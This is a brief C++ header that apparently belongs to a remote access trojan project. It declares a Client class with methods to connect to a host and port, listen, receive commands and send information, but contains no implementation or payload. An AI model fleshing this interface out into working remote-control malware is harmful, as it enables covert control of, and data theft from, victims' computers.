//
// Created by Dmitri on 2026-10-26.
//

#ifndef RAT_TARGET_CLIENT_H
#define RAT_TARGET_CLIENT_H
#include <string>


class Client {
public:
    void ReceiveCommand(std::string& command);
    void Connect(std::string& host, std::string& port);
    void Listen();
    void Send(std::string& info);
};


#endif //RAT_TARGET_CLIENT_H
